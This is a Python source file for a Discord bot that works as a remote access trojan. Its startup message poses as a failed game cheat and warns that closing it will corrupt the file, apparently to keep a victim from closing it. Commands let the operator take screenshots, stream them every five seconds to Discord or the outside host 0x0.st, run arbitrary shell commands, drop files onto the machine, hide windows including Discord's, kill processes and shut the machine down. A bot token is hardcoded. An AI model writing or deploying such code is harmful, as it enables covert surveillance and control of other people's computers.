import os
import subprocess
import tempfile
from pathlib import Path
import platform
import psutil
import requests
from PIL import ImageGrab
import discord
from discord.ext import commands
import win32gui
import win32con

# ========== CONFIG ==========
OWNER_ID = 1263857476579758160
ALLOWED_GUILD_ID = 1433444140464607355        # optional: restrict to your private guild
TOKEN = "MTQzMzQ0MzU0MDI1NTY0MTcwMg.GFgJWK.pvOSExLfwK2i2Wif2b9dQlDa3EQEc8U1f87T9U"
# ============================

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)

last_screenshot_path = None  # track last screenshot for deletion

def owner_check(ctx):
    if ctx.author.id != OWNER_ID:
        return False
    if ALLOWED_GUILD_ID and ctx.guild and ctx.guild.id != ALLOWED_GUILD_ID:
        return False
    return True

def require_owner():
    def predicate(ctx):
        if not owner_check(ctx):
            raise commands.CheckFailure("Not allowed.")
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f"failed to activate cheats")
    print("KEEP THE FILE OPEN.")
    print("if you close this, the file will become corrupted!")

# ===== Screenshots =====
def take_screenshot(path: Path):
    img = ImageGrab.grab()
    img.save(path, "PNG")

@bot.command(name="ss")
@require_owner()
async def ss(ctx):
    global last_screenshot_path
    await ctx.trigger_typing()
    try:
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
            last_screenshot_path = Path(tmp.name)
        take_screenshot(last_screenshot_path)
        await ctx.send(file=discord.File(str(last_screenshot_path), filename="screenshot.png"))
    except Exception as e:
        await ctx.send(f"Failed screenshot: {e}")

@bot.command(name="sspaste")
@require_owner()
async def sspaste(ctx):
    global last_screenshot_path
    await ctx.trigger_typing()
    try:
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
            tmp_path = Path(tmp.name)
        take_screenshot(tmp_path)

        # Upload to 0x0.st
        with open(tmp_path, "rb") as f:
            r = requests.post("https://0x0.st", files={"file": f}, timeout=30)
        if r.status_code == 200:
            url = r.text.strip()
            await ctx.send(f"Uploaded: {url}")
        else:
            await ctx.send("Upload failed, sending file instead.")
            await ctx.send(file=discord.File(str(tmp_path), filename="screenshot.png"))

        # Delete last screenshot
        if last_screenshot_path and last_screenshot_path.exists():
            last_screenshot_path.unlink(missing_ok=True)
        last_screenshot_path = tmp_path
    except Exception as e:
        await ctx.send(f"Failed sspaste: {e}")

# ===== Shutdown / Hibernate =====
@bot.command(name="shutdown")
@require_owner()
async def shutdown_cmd(ctx, confirm: str = None):
    if confirm != "confirm":
        await ctx.send("Use `.shutdown confirm` to actually shutdown.")
        return
    await ctx.send("Shutting down...")
    subprocess.Popen(["shutdown", "/s", "/t", "0"], shell=False)

@bot.command(name="nap")
@require_owner()
async def nap_cmd(ctx, confirm: str = None):
    if confirm != "confirm":
        await ctx.send("Use `.nap confirm` to actually hibernate.")
        return
    await ctx.send("Hibernating...")
    subprocess.Popen(["shutdown", "/h"], shell=False)

# ===== Download attachment =====
@bot.command(name="download")
@require_owner()
async def download_file(ctx):
    if not ctx.message.attachments:
        await ctx.send("No attachment found.")
        return
    attachment = ctx.message.attachments[0]
    save_path = Path("bot_files")
    save_path.mkdir(exist_ok=True)
    file_path = save_path / attachment.filename
    try:
        await attachment.save(file_path)
        await ctx.send(f"Saved `{attachment.filename}` to `{file_path.resolve()}`")
    except Exception as e:
        await ctx.send(f"Failed: {e}")

# ===== List apps and files =====
@bot.command(name="apps")
@require_owner()
async def list_apps(ctx):
    dirs = [Path("C:/Program Files"), Path("C:/Program Files (x86)")]
    apps = []
    for d in dirs:
        if d.exists():
            apps.extend([p.name for p in d.glob("**/*.exe")])
    text = "\n".join(apps[:50])
    if len(apps) > 50:
        text += f"\n...and {len(apps)-50} more."
    await ctx.send(f"**Installed apps:**\n{text or 'No apps found.'}")

@bot.command(name="files")
@require_owner()
async def list_python_files(ctx, folder: str = "."):
    folder_path = Path(folder)
    if not folder_path.exists() or not folder_path.is_dir():
        await ctx.send(f"Folder `{folder}` not found.")
        return
    py_files = [str(f.relative_to(folder_path)) for f in folder_path.rglob("*.py")]
    text = "\n".join(py_files[:50])
    if len(py_files) > 50:
        text += f"\n...and {len(py_files)-50} more."
    await ctx.send(f"**Python files in `{folder}`:**\n{text or 'No Python files.'}")

# ===== Open / Hide / Close =====
@bot.command(name="open")
@require_owner()
async def open_file(ctx, *, name: str):
    try:
        subprocess.Popen(name, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_MINIMIZE)
        await ctx.send(f"Opened `{name}` minimized.")
    except Exception as e:
        await ctx.send(f"Failed: {e}")

def hide_window_by_title(title):
    def enumHandler(hwnd, lParam):
        if win32gui.IsWindowVisible(hwnd) and title.lower() in win32gui.GetWindowText(hwnd).lower():
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    win32gui.EnumWindows(enumHandler, None)

@bot.command(name="hide")
@require_owner()
async def hide_app(ctx, *, name: str):
    try:
        hide_window_by_title(name)
        await ctx.send(f"Hid `{name}` window.")
    except Exception as e:
        await ctx.send(f"Failed: {e}")

@bot.command(name="hidediscord")
@require_owner()
async def hide_discord(ctx):
    try:
        hide_window_by_title("Discord")
        await ctx.send("Discord hidden.")
    except Exception as e:
        await ctx.send(f"Failed: {e}")

@bot.command(name="close")
@require_owner()
async def close_app(ctx, *, name: str):
    try:
        subprocess.run(f"taskkill /IM {name} /F", shell=True)
        for p in psutil.process_iter(['pid', 'name', 'cmdline']):
            if p.info['name'].lower() == 'python.exe' and any(name.lower() in arg.lower() for arg in p.info['cmdline']):
                psutil.Process(p.info['pid']).terminate()
        await ctx.send(f"Closed `{name}`.")
    except Exception as e:
        await ctx.send(f"Failed: {e}")

# ===== System info =====
@bot.command(name="info")
@require_owner()
async def system_info(ctx):
    uname = platform.uname()
    cpu_percent = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage("/")
    battery = psutil.sensors_battery()
    embed = discord.Embed(title="💻 Laptop Info", color=0x00ff00)
    embed.add_field(name="System", value=f"{uname.system} {uname.release} {uname.version}", inline=False)
    embed.add_field(name="Machine/Arch", value=f"{uname.machine}", inline=False)
    embed.add_field(name="CPU Usage", value=f"{cpu_percent}%", inline=True)
    embed.add_field(name="RAM Usage", value=f"{ram.percent}%", inline=True)
    embed.add_field(name="Disk Usage", value=f"{disk.percent}%", inline=True)
    if battery:
        embed.add_field(name="Battery", value=f"{battery.percent}% {'Charging' if battery.power_plugged else 'Not Charging'}", inline=True)
    await ctx.send(embed=embed)

# ===== Help =====
@bot.command(name="help")
@require_owner()
async def help_cmd(ctx):
    text = (
        ".shutdown confirm — shut down PC\n"
        ".nap confirm — hibernate\n"
        ".ss — screenshot\n"
        ".sspaste — screenshot to 0x0.st\n"
        ".download — download attached file\n"
        ".apps — list installed apps\n"
        ".files [folder] — list Python files\n"
        ".open <file/app> — open minimized\n"
        ".hide <file/app> — hide window\n"
        ".hidediscord — hide Discord window\n"
        ".close <file/app> — close program\n"
        ".info — system info\n"
        ",mss - sends an ss of the users screen in 5s intervals\n"
        ".stopmss - stops the mass screenshots\n"
    )
    await ctx.send(f"**Owner-only commands:**\n{text}")


import asyncio
import tempfile
from pathlib import Path

# Global variable to track the task
mss_task = None

async def mss_loop(channel):
    """Takes screenshots every 5 seconds, uploads to Discord, then deletes the file."""
    while True:
        tmp_path = None
        try:
            with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
                tmp_path = Path(tmp.name)
            take_screenshot(tmp_path)
            await channel.send(file=discord.File(str(tmp_path), filename="screenshot.png"))
        except Exception as e:
            await channel.send(f"Failed to take screenshot: {e}")
        finally:
            # Delete the file from laptop
            if tmp_path and tmp_path.exists():
                tmp_path.unlink(missing_ok=True)
        await asyncio.sleep(5)  # wait 5 seconds before next screenshot

@bot.command(name="mss")
@require_owner()
async def start_mss(ctx):
    global mss_task
    if mss_task and not mss_task.done():
        await ctx.send("MSS is already running.")
        return
    mss_task = bot.loop.create_task(mss_loop(ctx.channel))
    await ctx.send("Started continuous screenshots every 5 seconds. Use `.stopmss` to stop.")

@bot.command(name="stopmss")
@require_owner()
async def stop_mss(ctx):
    global mss_task
    if mss_task and not mss_task.done():
        mss_task.cancel()
        try:
            await mss_task
        except asyncio.CancelledError:
            pass
        await ctx.send("Stopped continuous screenshots.")
    else:
        await ctx.send("MSS is not running.")

# ===== Error handling =====
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("You are not allowed to use this command.")
    else:
        await ctx.send(f"Error: {error}")

# ===== Run bot =====
if __name__ == "__main__":
    bot.run(TOKEN)
